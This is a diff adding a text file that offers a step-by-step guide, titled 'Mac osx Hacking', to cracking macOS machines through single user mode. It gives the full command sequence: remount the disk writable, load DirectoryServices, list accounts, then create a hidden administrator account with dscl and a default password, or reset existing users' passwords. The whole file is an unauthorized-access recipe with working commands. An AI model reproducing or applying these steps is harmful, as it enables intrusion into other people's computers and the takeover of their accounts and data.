@@ -1,0 +1,150 @@
+
+/*===============================================================================================================*/
+/*	      	     	Mac osx Hacking	 	  */
+/*===============================================================================================================*/
+
+How to crack macs by booting into single user mode
+
+This can be used to change user passwords or create new accounts
+
+/*===============================================================================================================*/
+
+1 - Shutdown the Mac by pressing the power button
+
+2 - Then press the power button again to restart the Mac
+
+3 - Straight away hold down cmd S on the keyboard
+
+4 - When a console window appears you can let go of cmd s on the keyboard
+
+
+/*===============================================================================================================*/
+
+5 - Verify integrity of the filesystem  
+
+This is to make sure we can edit files on the drive
+
+Type the following command and then press return
+(This will verify integrity of the filesystem and check the file permissions)
+
+/sbin/fsck -fy
+
+
+The command may take a couple of minutes becuase it is checking the permissions on the drive
+
+
+/*===============================================================================================================*/
+
+6 - Mount the filesystem
+
+We have to mount the filesystem to be able to make changes to the files on the disk
+
+Type the following command and then press return
+(This will mount the filesystem like mounting a drive in the Finder)
+
+/sbin/mount -uw /
+
+
+
+/*===============================================================================================================*/
+
+7 - Loading the dscl command line tool
+
+dscl is a command line tool to change passwords on existing accounts,  
+or create new accounts on the Mac
+
+Before we can use the dscl command line tool we have to load it
+This is becuase we havent booted into the Mac desktop and so dscl hasnt loaded yet
+
+We are going to using launchctl to load a DirectoryServices.plist file,
+which will then allow us to use the dscl command line program
+
+launchctl is a program used to launch certain processes or applications when the Mac boots up
+
+
+Type the following command and then press return
+(This allows you to use the dscl command line tool to change passwords or create new accounts)
+
+launchctl load /System/Library/LaunchDaemons/com.apple.DirectoryServices.plist
+
+/*===============================================================================================================*/
+
+8 - Listing users accounts on the Mac
+
+Type the following command and then press return
+(This will list all the user accounts)
+
+ls /Users
+
+
+Make a note of the user account names,  
+they are needed in the next step when we will reset their passwords
+
+/*===============================================================================================================*/
+
+9 - Listing the UniqueID of accounts on the Mac
+
+Type the following command and then press return
+(This will list the UniqueID of accounts on the Mac)
+
+dscl . -list /Users UniqueID | sort -n -k2,2
+
+
+make a note of the user accounts on the system and their UniqueID
+
+if there is one account on the system it should have a UniqueID ID of 501
+
+You need to find the account with the highest Unique ID in the 500 range
+
+Then you pick the next highest number to use when you create the account in the next step
+
+eg if the account with highest Unique ID is 501, then you can use 502 as the Unique ID in the next step
+
+
+/*===============================================================================================================*/
+
+10 - Creating a new account
+
+
+
+dscl . -create /Users/admin
+dscl . -create /Users/admin UserShell /bin/bash
+dscl . -create /Users/admin RealName “admin”
+dscl . -create /Users/admin UniqueID 502 
+dscl . -create /Users/admin PrimaryGroupID 80 
+dscl . -create /Users/admin NFSHomeDirectory /Users/admin 
+dscl . -passwd /Users/admin password
+dscl . -append /Groups/admin GroupMembership admin
+exit
+
+Create the users home directory
+
+sudo createhomedir -c -u admin
+
+
+type reboot to reboot the Mac
+
+reboot
+
+
+/*===============================================================================================================*/
+
+11 - Log in to the new account
+
+
+When the Mac is rebooting just before the blue screen comes up
+
+press the shift key to bring up the login window instead of automatically logining in
+
+So we dont log into the account already on the Mac
+
+
+In the log in window fill in the username and password you created
+
+eg
+
+admin
+
+password
+
+
